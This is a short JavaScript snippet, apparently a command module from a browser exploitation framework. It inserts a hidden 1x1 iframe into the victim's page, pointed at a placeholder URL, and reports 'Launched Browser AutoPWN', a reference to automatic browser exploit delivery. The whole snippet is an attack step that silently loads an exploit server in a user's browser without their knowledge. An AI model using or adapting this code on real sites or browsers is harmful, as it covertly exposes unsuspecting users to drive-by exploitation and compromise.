// iframe.setAttribute("style", "visibility:hidden;"); doesn't work with ie

function do_main(){
	var iframe = document.createElement('iframe');
	iframe.src = 'URL';
	iframe.setAttribute("width", "1");
  	iframe.setAttribute("height", "1");
	iframe.setAttribute("style", "visibility:hidden;");
	document.body.appendChild(iframe);

	return "Launched Browser AutoPWN";
}

return_result(result_id, do_main());
